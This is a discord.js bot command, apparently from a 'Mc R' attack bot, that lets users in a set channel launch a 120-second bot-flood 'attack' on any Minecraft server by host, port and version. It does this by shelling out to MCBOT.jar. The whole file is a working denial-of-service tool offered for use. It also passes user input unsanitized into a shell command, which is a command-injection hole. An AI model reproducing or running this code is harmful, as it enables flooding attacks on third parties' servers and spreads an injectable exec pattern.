const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Formato ;pingjoin 1.1.1.1 25565 47`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Se requiere especificar el puerto`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Se requiere especificar la versión`")
	message.channel.send(embed1);
	return;
	}
	
  
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCBOT.jar ${host}:${port} ${protocol} pingjoin 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Ataque detenido ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**► ¡Ataque finalizado 💥**")
	.setFooter('© Developer: Mac#1770.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Iniciando ataque ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**Usuario**: `" + message.author.username + "` \n **Servidor**: `" + host + "` \n **Puerto**: `" + port + "` \n **Versión**: `" + protocol + "`\n \n **Método**: `BotJoiner 💥` \n **Cantidad de Bots**: `10.000 🚀` \n **Tiempo**: `120 segundos 🕒`")
	.setFooter('© Developer: Mac#1770.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['pingjoin'],
  permLevel: 0
}

exports.help = {
  name: 'pingjoin',
  description: 'Özel',
  usage: 'pingjoin'
}